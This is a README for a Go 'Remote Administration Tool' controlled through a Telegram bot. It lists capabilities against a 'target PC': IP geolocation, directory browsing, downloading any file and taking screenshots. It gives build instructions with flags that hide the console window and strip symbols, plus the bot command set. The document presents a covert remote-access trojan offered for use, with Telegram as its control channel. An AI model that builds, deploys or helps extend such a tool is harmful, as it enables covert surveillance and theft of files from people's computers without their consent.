![](https://img.shields.io/badge/Made%20with-Go-blue)

Remote Administration Tool via Telegram (now in Go 1.20!)

## Features:

- Get target PC's IP address information and approximate location on map
- Show current directory
- Change current directory
- Download any file from the target
- Take screenshot

& More coming soon!

## Installation & Usage:

- Set up a new Telegram bot talking to the `BotFather`
- Copy this token and chat ID and replace it in the beginning of the script
- Clone this repository.
- CD GoTelegramRAT
- RUN go mod tidy
- RUN go build -ldflags "-H windowsgui -s -w" .\cmd\main\main.go

### Commands:

When using the below commands use `/` as a prefix.

```
/info - user information.
/pwd - current directory.
/cd <folder> - change folder."
/ls - display the contents of directories.
/download <filePath> - download file"
/screen - take screenshot"
```